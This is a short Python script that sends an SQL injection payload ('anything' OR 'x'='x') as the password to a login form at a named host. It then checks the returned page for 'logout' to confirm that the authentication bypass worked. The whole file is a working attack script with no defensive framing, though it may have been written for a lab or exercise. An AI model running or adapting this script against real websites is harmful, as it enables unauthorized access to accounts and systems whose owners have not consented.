import requests

#SELECT condition will always be true
usernameField = ''
passwordField = 'anything\' OR \'x\'=\'x'
url = 'http://apache1.willilazarov.cz/'

payload = {'username': usernameField,
          'password': passwordField,
           'login':'login'
           }

#instance to make a post request to the login url with  login details as a payload
r = requests.Session()
r.post(url, data=payload)

#all scraped data are saved to string
data = r.get(url).text

#if website contains "logout" user is loged in
if("logout" in data):
    print('User is now logged in')
else:
    print('Unable to login')

